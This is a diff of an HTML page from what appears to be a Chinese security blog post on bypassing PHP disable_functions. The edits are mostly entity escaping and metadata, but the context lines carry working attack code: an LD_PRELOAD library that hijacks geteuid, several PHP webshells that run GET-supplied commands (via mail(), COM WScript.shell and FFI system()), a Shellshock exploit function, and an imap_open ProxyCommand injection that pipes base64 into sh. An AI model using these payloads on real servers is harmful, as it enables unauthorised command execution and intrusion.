@@ -196,10 +196,10 @@
     };
     loaded();
 })()
- </script>
+ </script><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><style type="text/css" lang="css">
+<style type="text/css" lang="css">
     #loading-container{
         position: fixed;
         top: 0;
@@ -508,7 +508,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -667,14 +667,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    9.6k
+                    9.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    40 分
+                    41 分
                 </div>
                 
                 
@@ -789,9 +789,9 @@ echo $stroutput;
 <p><a href="https://cloud.tencent.com/developer/article/1683012" target="_blank" rel="noopener">Linux共享库、静态库、动态库详解</a></p>
 <p>首先我们自己创建一个生成随机10个数的代码</p>
 <p>random.c </p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span>
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
@@ -801,8 +801,8 @@ echo $stroutput;
 <p>我们先编译运行一下看看效果</p>
 <pre><code>gcc random.c -o random</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004135639016.png" alt="image-20211004135639016"></p>
 <p>接着再去编一个，只返回66数值  随便去一个random1.c</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 <span class="token keyword">int</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token number">66</span><span class="token punctuation">;</span>    
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -819,9 +819,9 @@ echo $stroutput;
 <p>攻击过程：<br>1、生成含有恶意代码的动态链接程序。<br>2、运用<code>putenv</code>来设置<code>LD_PRELOAD</code>，优先调用我们编写的程序。<br>3、通过webshell触发函数（mail）</p>
 <p>因为我们用的是getuid的函数，可以查看一下</p>
 <pre><code>readelf -Ws /usr/sbin/sendmail | grep "getuid"</code></pre><p>创建test.c (获取LD_PRELOAD环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由system函数获取的系统命令)</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 
 <span class="token keyword">int</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> cmdline <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -835,18 +835,18 @@ echo $stroutput;
 <p>test.php</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p>";</span>
+    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">&gt;</span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;";</span>
     <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>
+    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" &gt; "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2&gt;&amp;1"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>
     <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span> 
+    <span class="token keyword">echo</span> <span class="token string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p&gt;"</span><span class="token punctuation">;</span> 
     <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>cmd是我们要执行的参数，outpath输出的路径，sopath是我们的动态链接库</p>
 <p>哎。。又磨了一下午没磨出来</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004163842159.png" alt="image-20211004163842159"></p>
@@ -859,9 +859,9 @@ echo $stroutput;
 <p>bypass_disablefunc.c</p>
 <pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span>
 
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 
 
 <span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span>
@@ -887,18 +887,18 @@ echo $stroutput;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>bypass_disablefunc.php  这个跟上面的test.php一样</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p>";</span>
+    <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span></span>example<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">&gt;</span></span></span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;";</span>
     <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" > "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2>&amp;1"</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span>
+    <span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">" &gt; "</span> <span class="token punctuation">.</span> <span class="token variable">$out_path</span> <span class="token punctuation">.</span> <span class="token string">" 2&gt;&amp;1"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p&gt;"</span><span class="token punctuation">;</span>
     <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"EVIL_CMDLINE="</span> <span class="token punctuation">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD="</span> <span class="token punctuation">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span> 
+    <span class="token keyword">echo</span> <span class="token string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> <span class="token punctuation">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p&gt;"</span><span class="token punctuation">;</span> 
     <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>直接蚁剑上传</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004170528491.png" alt="image-20211004170528491"></p>
 <p>访问目标网站</p>
@@ -918,11 +918,11 @@ echo $stroutput;
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 生成一个COM对象　Shell.Application也能</span>
-<span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c"</span><span class="token punctuation">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用对象方法来执行命令</span>
-<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c"</span><span class="token punctuation">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用对象方法来执行命令</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006134719919.png" alt="image-20211006134719919"></p>
 <h3 id="利用PHP-7-4-FFI绕过"><a href="#利用PHP-7-4-FFI绕过" class="headerlink" title="利用PHP 7.4 FFI绕过"></a>利用PHP 7.4 FFI绕过</h3><p>什么是FFI：外部函数接口。可以让用户在php里面调用c代码</p>
 <p>条件：</p>
@@ -939,10 +939,10 @@ echo $stroutput;
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"$cmd > /tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
+<span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"$cmd &gt; /tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
 <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/ash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>当然主要是因为FFI:cdef这个函数的作用</p>
 <pre><code>$ffi = FFI::cdef("int system(const char *command);"); //声明了c语言中的system函数</code></pre><p>然后再是</p>
 <pre><code>$ffi-&gt;system("$cmd &gt; /tmp/ash"); //通过GET传递的命令去执行</code></pre><p>因为输入的命令是没有回显，所以我们就需要去写进一个可读可写的路径下，就利用了</p>
@@ -994,7 +994,7 @@ echo $stroutput;
 
 <span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Execute a command via CVE-2014-6271 @mail.c:283 </span>
    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-   <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PHP_LOL=() { x; }; $cmd >$tmp 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+   <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment" spellcheck="true">// In Safe Mode, the user may only alter environment variableswhose names </span>
    <span class="token comment" spellcheck="true">// begin with the prefixes supplied by this directive. </span>
    <span class="token comment" spellcheck="true">// By default, users will only be able to set environment variablesthat </span>
@@ -1008,7 +1008,7 @@ echo $stroutput;
    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string">"No output, or not vuln."</span><span class="token punctuation">;</span> 
 <span class="token punctuation">}</span> 
 <span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>我直接上传到www的目录下就可以执行</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006205942034.png" alt="image-20211006205942034"></p>
 <p>但是看别人的文章，是上传到了/var/tmp目录下通过www/html目录下的一句话，include包含了、tmp目录来执行，</p>
@@ -1056,9 +1056,9 @@ root@kali:# ssh -oProxyCommand="echo dG91Y2ggYXNoCg==|base64 -d|sh" localhost</c
 
 <span class="token punctuation">}</span>
 
-<span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string">"x -oProxyCommand=echo\t"</span> <span class="token punctuation">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">">/tmp/result"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"|base64\t-d|sh}"</span><span class="token punctuation">;</span>
+<span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string">"x -oProxyCommand=echo\t"</span> <span class="token punctuation">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&gt;/tmp/result"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"|base64\t-d|sh}"</span><span class="token punctuation">;</span>
 
-<span class="token operator">*</span><span class="token comment" spellcheck="true">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';*</span>
+<span class="token operator">*</span><span class="token comment" spellcheck="true">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . "&gt;/tmp/cmd_result") . '|base64$IFS$()-d|sh}';*</span>
 
 <span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string">'{'</span> <span class="token punctuation">.</span> <span class="token variable">$cmd</span> <span class="token punctuation">.</span> <span class="token string">':143/imap}INBOX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">// or var_dump("\n\nError: ".imap_last_error());*</span>
 
@@ -1066,7 +1066,7 @@ root@kali:# ssh -oProxyCommand="echo dG91Y2ggYXNoCg==|base64 -d|sh" localhost</c
 
 <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>显示判断是否存在imap_open，然后后就是我们要传递的命令进去，输入结果并显示出来。sleep(5)是等待imap_open执行完</p>
 <p><strong>安装php的imap_open</strong></p>
 <pre><code>apt-get install php-imap</code></pre><p>安装完了之后去php.ini中打开，imap.enable_insecure_rsh选项为On </p>
@@ -1182,7 +1182,7 @@ AAAAAElFTkSuQmCC"<span class="token punctuation">;</span>
 
   <span class="token variable">$imagick</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token variable">$imagick</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token variable">$imageBlob</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
